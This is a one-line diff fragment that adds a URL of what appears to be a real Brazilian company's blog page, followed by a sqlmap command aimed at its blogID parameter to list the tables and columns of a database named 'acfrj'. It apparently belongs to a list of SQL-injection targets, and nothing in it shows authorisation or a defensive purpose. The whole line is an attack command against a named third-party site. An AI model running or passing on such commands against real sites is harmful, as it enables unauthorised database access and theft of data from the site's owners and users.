@@ -1,0 +1,1 @@
+https://www.visualset.com.br/blog/post.php?blogID=117 (GET)  # sqlmap.py -u https://www.visualset.com.br/blog/post.php?blogID=117 -D acfrj --tables --columns --threads=20
